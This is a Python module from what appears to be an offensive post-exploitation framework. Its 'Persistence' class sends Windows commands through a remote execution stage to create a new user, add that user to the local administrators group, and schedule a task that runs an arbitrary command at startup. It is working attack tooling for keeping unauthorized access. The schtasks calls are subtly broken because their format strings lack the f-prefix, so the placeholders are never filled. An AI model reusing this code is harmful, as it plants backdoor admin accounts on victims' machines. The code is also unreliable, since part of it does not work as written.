from stages.execution import Execution

class Persistence():
    def __init__(self, session):
        self.session = session
        self.execution = Execution(session=session)

    def create_user(self, username, password, url):
        self.execution.execute_command(
            f'net user {username} {password} /add',
            url
        )
        self.execution.execute_command(
             f'net localgroup administrators {username} /add',
             url
        )
        response = self.execution.execute_command(
            f'net user {username}',
            url
        )
        if username.lower() in response.lower():
             return f"User {username} created successfully."
        else:             
            return f"Failed to create user {username}."
        
    def schedule_task(self, task_name, command, user, url):
        self.execution.execute_command("schtasks /create /tn '{task_name}' /tr '{command}' /sc onstart /ru {user}", url)
        response = self.execution.execute_command("schtasks /query /tn '{task_name}'", url)
        if "{task_name}" in response:
            return "Scheduled task created successfully."
        else:
            return "Failed to create scheduled task."
   